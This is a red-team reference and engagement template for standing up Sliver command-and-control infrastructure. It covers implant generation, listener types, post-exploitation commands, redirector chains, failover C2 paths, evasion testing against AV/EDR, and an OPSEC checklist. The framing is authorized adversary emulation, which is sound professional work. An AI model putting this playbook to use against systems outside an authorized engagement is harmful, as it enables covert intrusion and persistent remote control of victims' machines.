# Building C2 Infrastructure With Sliver Framework

## API Reference

## Sliver CLI Commands
| Command | Description |
|---------|-------------|
| `generate --mtls host:port` | Generate session implant |
| `generate beacon --mtls host:port` | Generate beacon implant |
| `mtls --lhost IP --lport PORT` | Start mTLS listener |
| `https --lhost IP --lport PORT` | Start HTTPS listener |
| `dns --domains domain.com` | Start DNS listener |
| `sessions` | List active sessions |
| `beacons` | List active beacons |
| `use SESSION_ID` | Interact with session |

## Generate Options
| Flag | Description |
|------|-------------|
| `--name` | Implant name |
| `--os` | Target OS (windows/linux/darwin) |
| `--arch` | Architecture (amd64/386/arm64) |
| `--format` | exe/shellcode/shared-lib |
| `--seconds` | Beacon callback interval |
| `--jitter` | Beacon jitter percentage |
| `--mtls` | mTLS C2 endpoint |
| `--https` | HTTPS C2 endpoint |
| `--dns` | DNS C2 domain |

## Listener Types
| Type | Port | Use Case |
|------|------|----------|
| mTLS | 8888 | Encrypted, reliable |
| HTTPS | 443 | Blends with web traffic |
| DNS | 53 | Bypasses network filters |
| WireGuard | 51820 | VPN-based C2 |

## Post-Exploitation
```
execute-assembly     # .NET assembly in memory
sideload             # DLL sideloading
shell                # Interactive shell
upload/download      # File transfer
portfwd              # Port forwarding
socks5               # SOCKS5 proxy
```

## Sliver gRPC API (Protobuf)
```python
import grpc
from sliverpb import client_pb2_grpc
channel = grpc.secure_channel("localhost:31337", credentials)
stub = client_pb2_grpc.SliverRPCStub(channel)
```

---

## Standards and Controls

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|-------------|------|--------|
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |
| T1071.004 | Application Layer Protocol: DNS | Command and Control |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | Command and Control |
| T1090.002 | Proxy: External Proxy | Command and Control |
| T1105 | Ingress Tool Transfer | Command and Control |
| T1132.001 | Data Encoding: Standard Encoding | Command and Control |
| T1572 | Protocol Tunneling | Command and Control |

## Industry Standards

- **PTES (Penetration Testing Execution Standard)** - Post-Exploitation and C2 sections
- **OWASP Testing Guide** - Infrastructure testing methodology
- **NIST SP 800-115** - Technical Guide to Information Security Testing and Assessment
- **TIBER-EU** - Threat Intelligence-Based Ethical Red Teaming framework

## Official Documentation

- Sliver GitHub: https://github.com/BishopFox/sliver
- Sliver Wiki: https://github.com/BishopFox/sliver/wiki
- Sliver Armory: https://github.com/sliverarmory

## Key Research

- BishopFox Red Team Tools and C2 Frameworks Report (2025)
- SpecterOps Adversary Simulation methodology
- SANS SEC565: Red Team Operations and Adversary Emulation

---

## Workflows

## Infrastructure Deployment Workflow

```
1. Planning Phase
   ├── Define engagement scope and authorized targets
   ├── Select cloud providers for team server and redirectors
   ├── Register domains for C2 channels (categorized domains preferred)
   └── Obtain SSL certificates (Let's Encrypt or purchased)

2. Team Server Setup
   ├── Deploy VPS with hardened OS configuration
   ├── Install Sliver server daemon
   ├── Configure firewall rules (restrict to redirector IPs only)
   └── Generate operator configs for team members

3. Redirector Layer
   ├── Deploy 2+ redirector VPS instances in different regions
   ├── Configure NGINX reverse proxy on each redirector
   ├── Implement Apache mod_rewrite rules for traffic filtering
   └── Optionally add Cloudflare CDN layer

4. Listener Configuration
   ├── HTTPS listener (primary) with valid SSL cert
   ├── DNS listener (fallback) for restricted networks
   ├── mTLS listener (high-security sessions)
   └── WireGuard listener (tunneled access)

5. Implant Generation
   ├── Generate OS-specific beacons (Windows, Linux, macOS)
   ├── Configure callback intervals and jitter
   ├── Test implant connectivity through redirector chain
   └── Validate implant evasion against target AV/EDR

6. Operational Use
   ├── Deploy implant to target via initial access vector
   ├── Establish C2 session through redirector infrastructure
   ├── Execute post-exploitation tasks
   └── Maintain operational security throughout engagement
```

## Failover and Resilience Workflow

```
Primary C2 Path:
  Target → Redirector A → Team Server (HTTPS/443)

Failover Path 1:
  Target → Redirector B → Team Server (HTTPS/8443)

Failover Path 2:
  Target → DNS Resolver → Team Server (DNS/53)

Emergency Path:
  Target → WireGuard Tunnel → Team Server (UDP/51820)
```

## Multi-Operator Workflow

```
1. Team Lead generates operator configs:
   sliver-server > new-operator --name <operator> --lhost <server-ip>

2. Distribute .cfg files securely to each operator

3. Operators connect using Sliver client:
   sliver-client import <operator-config.cfg>

4. All operators share access to beacons and sessions
5. Use naming conventions for implants per operator
```

---

## Working Template

## Engagement Information

| Field | Value |
|-------|-------|
| Engagement Name | |
| Client | |
| Start Date | |
| End Date | |
| Authorization Document | |

## Team Server Configuration

| Parameter | Value |
|-----------|-------|
| Server IP | |
| Server OS | Ubuntu 22.04 LTS |
| Sliver Version | |
| Firewall Rules Applied | Yes / No |
| SSH Key-Only Auth | Yes / No |

## Listener Configuration

| Listener Type | Port | Domain/Host | Certificate | Status |
|--------------|------|-------------|-------------|--------|
| HTTPS | 443 | | Let's Encrypt / Custom | |
| mTLS | 8888 | | Auto-generated | |
| DNS | 53 | | N/A | |
| WireGuard | 51820 | | Auto-generated | |

## Redirector Configuration

| Redirector ID | IP Address | Cloud Provider | Proxy Software | Team Server Dest |
|--------------|------------|----------------|----------------|------------------|
| REDIR-01 | | | NGINX | |
| REDIR-02 | | | Apache | |

## Operator Access

| Operator Name | Config File | Role | Access Granted |
|--------------|-------------|------|----------------|
| | | Lead | |
| | | Operator | |

## Domain Configuration

| Domain | Registrar | Category | Purpose |
|--------|-----------|----------|---------|
| | | Uncategorized | HTTPS C2 |
| | | Uncategorized | DNS C2 |

## Implant Inventory

| Implant Name | Type | OS | Arch | Protocol | Callback Interval | Jitter |
|-------------|------|-----|------|----------|-------------------|--------|
| | Beacon | Windows | amd64 | HTTPS | 60s | 30% |
| | Session | Linux | amd64 | mTLS | N/A | N/A |

## OPSEC Checklist

- [ ] Team server IP not directly exposed to target network
- [ ] All C2 traffic routed through redirectors
- [ ] SSL certificates use categorized/aged domains
- [ ] DNS C2 domain registered with privacy protection
- [ ] Beacon intervals randomized with jitter
- [ ] Implant names do not reveal engagement details
- [ ] Operator configs distributed via secure channel
- [ ] Kill date configured on all implants
